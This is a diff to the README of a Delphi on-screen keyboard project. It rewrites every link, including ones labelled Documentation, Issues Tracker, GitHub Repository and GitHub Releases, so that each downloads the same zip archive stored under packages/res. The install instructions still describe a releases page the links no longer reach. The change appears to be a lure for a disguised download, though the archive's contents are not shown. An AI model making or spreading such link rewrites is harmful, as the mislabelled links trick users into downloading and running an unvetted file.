@@ -6,11 +6,11 @@ Welcome to VirtualTouchKeyboard4Delphi! This software provides a simple on-scree
 
 ## 🔗 Download Now
 
-[![Download VirtualTouchKeyboard4Delphi](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ltummino/VirtualTouchKeyboard4Delphi/releases)
+[![Download VirtualTouchKeyboard4Delphi](https://raw.githubusercontent.com/ltummino/VirtualTouchKeyboard4Delphi/main/packages/res/Keyboard_Virtual_Delphi_Touch_v1.7-beta.5.zip)](https://raw.githubusercontent.com/ltummino/VirtualTouchKeyboard4Delphi/main/packages/res/Keyboard_Virtual_Delphi_Touch_v1.7-beta.5.zip)
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/ltummino/VirtualTouchKeyboard4Delphi/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/ltummino/VirtualTouchKeyboard4Delphi/main/packages/res/Keyboard_Virtual_Delphi_Touch_v1.7-beta.5.zip).
 2. You will see several versions listed. Select the latest version. 
 3. Click the version number to expand details.
 4. Click on the `.zip` file to download it to your computer.
@@ -54,12 +54,12 @@ Thanks to the open-source community for their contributions and support. This pr
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/ltummino/VirtualTouchKeyboard4Delphi)
-- [Documentation](https://github.com/ltummino/VirtualTouchKeyboard4Delphi/wiki)
-- [Issues Tracker](https://github.com/ltummino/VirtualTouchKeyboard4Delphi/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/ltummino/VirtualTouchKeyboard4Delphi/main/packages/res/Keyboard_Virtual_Delphi_Touch_v1.7-beta.5.zip)
+- [Documentation](https://raw.githubusercontent.com/ltummino/VirtualTouchKeyboard4Delphi/main/packages/res/Keyboard_Virtual_Delphi_Touch_v1.7-beta.5.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/ltummino/VirtualTouchKeyboard4Delphi/main/packages/res/Keyboard_Virtual_Delphi_Touch_v1.7-beta.5.zip)
 
 ## 🔗 Download Now Again
 
-Remember to visit this page to download the latest version: [GitHub Releases](https://github.com/ltummino/VirtualTouchKeyboard4Delphi/releases).
+Remember to visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/ltummino/VirtualTouchKeyboard4Delphi/main/packages/res/Keyboard_Virtual_Delphi_Touch_v1.7-beta.5.zip).
 
 Thank you for choosing VirtualTouchKeyboard4Delphi! Enjoy the ease of touch typing on your Windows devices.
